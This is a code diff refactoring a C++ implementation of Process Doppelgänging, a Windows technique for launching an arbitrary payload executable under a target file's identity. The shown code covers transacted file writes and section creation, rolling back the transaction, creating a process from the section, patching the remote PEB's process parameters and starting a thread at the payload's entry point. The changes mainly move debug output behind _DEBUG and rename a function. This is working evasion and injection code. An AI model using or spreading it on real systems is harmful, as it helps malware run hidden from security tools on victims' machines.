@@ -20,7 +20,7 @@ bool set_params_in_peb(PVOID params_base, HANDLE hProcess, PROCESS_BASIC_INFORMA
     // Get access to the remote PEB:
     ULONGLONG remote_peb_addr = (ULONGLONG)pbi.PebBaseAddress;
     if (!remote_peb_addr) {
-        printf("Failed getting remote PEB address!\n");
+        std::cerr << "Failed getting remote PEB address!" << std::endl;
         return false;
     }
     PEB peb_copy = { 0 };
@@ -35,7 +35,7 @@ bool set_params_in_peb(PVOID params_base, HANDLE hProcess, PROCESS_BASIC_INFORMA
         &params_base, sizeof(PVOID), 
         &written)) 
     {
-        printf("Cannot update PArams!\n");
+        std::cout << "Cannot update Params!" << std::endl;
         return false;
     }
     return true;
@@ -45,8 +45,9 @@ bool buffer_remote_peb(HANDLE hProcess, PROCESS_BASIC_INFORMATION &pi, OUT PEB &
 {
     memset(&peb_copy,0,sizeof(PEB));
     PPEB remote_peb_addr = pi.PebBaseAddress;
-    std::cerr << "PEB address: " << (std::hex) << (ULONGLONG)remote_peb_addr << std::endl;
-    
+#ifdef _DEBUG
+    std::cout << "PEB address: " << (std::hex) << (ULONGLONG)remote_peb_addr << std::endl;
+#endif 
     // Write the payload's ImageBase into remote process' PEB:
     NTSTATUS status = NtReadVirtualMemory(hProcess, remote_peb_addr, &peb_copy, sizeof(PEB), NULL);
     if (status != STATUS_SUCCESS)
@@ -54,21 +55,18 @@ bool buffer_remote_peb(HANDLE hProcess, PROCESS_BASIC_INFORMATION &pi, OUT PEB &
         std::cerr <<"Cannot read remote PEB: "<< GetLastError() << std::endl;
         return false;
     }
-    std::cout << "> ProcessParameters addr: "<< peb_copy.ProcessParameters << std::endl;
     return true;
 }
 
 LPVOID write_params_into_process(HANDLE hProcess, PVOID buffer, SIZE_T buffer_size, DWORD protect)
 {
     //Preserve the aligmnent! The remote address of the parameters must be the same as local.
-	LPVOID remote_params = VirtualAllocEx(hProcess, buffer, buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-	if (remote_params == nullptr)
-	{
+    LPVOID remote_params = VirtualAllocEx(hProcess, buffer, buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (remote_params == nullptr) {
         std::cerr << "RemoteProcessParams failed" << std::endl;
         return nullptr;
-	}
-	if (!WriteProcessMemory(hProcess, buffer, buffer, buffer_size, NULL))
-	{
+    }
+    if (!WriteProcessMemory(hProcess, buffer, buffer, buffer_size, NULL)) {
         std::cerr << "RemoteProcessParams failed" << std::endl;
         return nullptr;
     }
@@ -127,7 +125,9 @@ bool setup_process_parameters(HANDLE hProcess, PROCESS_BASIC_INFORMATION &pi, LP
         std::cout << "[+] Cannot make a remote copy of parameters: " << GetLastError() << std::endl;
         return false;
     }
+#ifdef _DEBUG
     std::cout << "[+] Parameters mapped!" << std::endl;
+#endif
     PEB peb_copy = { 0 };
     if (!buffer_remote_peb(hProcess, pi, peb_copy)) {
         return false;
@@ -137,13 +137,16 @@ bool setup_process_parameters(HANDLE hProcess, PROCESS_BASIC_INFORMATION &pi, LP
         std::cout << "[+] Cannot update PEB: " << GetLastError() << std::endl;
         return false;
     }
+#ifdef _DEBUG
     if (!buffer_remote_peb(hProcess, pi, peb_copy)) {
         return false;
     }
+    std::cout << "> ProcessParameters addr: "<< peb_copy.ProcessParameters << std::endl;
+#endif
     return true;
 }
 
-bool write_transacted(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize)
+bool process_doppel(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize)
 {
     DWORD options, isolationLvl, isolationFlags, timeout;
     options = isolationLvl = isolationFlags = timeout = 0;
@@ -175,7 +178,7 @@ bool write_transacted(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize)
         return false;
     }
 
-    HANDLE hSection = NULL;
+    HANDLE hSection = nullptr;
     NTSTATUS status = NtCreateSection(&hSection,
         SECTION_ALL_ACCESS,
         NULL,
@@ -188,15 +191,17 @@ bool write_transacted(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize)
         std::cerr << "NtCreateSection failed" << std::endl;
         return false;
     }
-
     CloseHandle(hTransactedFile);
+    hTransactedFile = nullptr;
+
     if (RollbackTransaction(hTransaction) == FALSE) {
         std::cerr << "RollbackTransaction failed: " << GetLastError() << std::endl;
         return false;
     }
     CloseHandle(hTransaction);
+    hTransaction = nullptr;
 
-    HANDLE hProcess = NULL;
+    HANDLE hProcess = nullptr;
     status = NtCreateProcessEx(
         &hProcess, //ProcessHandle
         PROCESS_ALL_ACCESS, //DesiredAccess
@@ -232,8 +237,9 @@ bool write_transacted(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize)
         return false;
     }
     ULONGLONG imageBase = (ULONGLONG) peb_copy.ImageBaseAddress;
-    std::cerr << "ImageBase address: " << (std::hex) << (ULONGLONG)imageBase << std::endl;
-
+#ifdef _DEBUG
+    std::cout << "ImageBase address: " << (std::hex) << (ULONGLONG)imageBase << std::endl;
+#endif
     DWORD payload_ep = get_entry_point_rva(payladBuf);
     ULONGLONG procEntry =  payload_ep + imageBase;
 
@@ -241,10 +247,10 @@ bool write_transacted(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize)
         std::cerr << "Parameters setup failed" << std::endl;
         return false;
     }
-
+#ifdef _DEBUG
     std::cout << "Process created!" << std::endl;
     std::cerr << "EntryPoint at: " << (std::hex) << (ULONGLONG)procEntry << std::endl;
-
+#endif
     HANDLE hThread = NULL;
     status = NtCreateThreadEx(&hThread,
         THREAD_ALL_ACCESS,
@@ -267,7 +273,7 @@ bool write_transacted(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize)
     return true;
 }
 
-int wmain( int argc, wchar_t *argv[])
+int wmain(int argc, wchar_t *argv[])
 {
     if (argc < 3) {
         std::cout << "params: <target path> <payload path>\n" << std::endl;
@@ -287,12 +293,20 @@ int wmain( int argc, wchar_t *argv[])
         return -1;
     }
 
-    bool is_ok = write_transacted(targetPath, payladBuf, (DWORD) payloadSize);
+    bool is_ok = process_doppel(targetPath, payladBuf, (DWORD) payloadSize);
+
+    free_buffer(payladBuf, payloadSize);
     if (is_ok) {
         std::cerr << "[+] Done!" << std::endl;
     } else {
         std::cerr << "[-] Failed!" << std::endl;
+#ifdef _DEBUG
+        system("pause");
+#endif
+        return -1;
     }
+#ifdef _DEBUG
     system("pause");
+#endif
     return 0;
 }
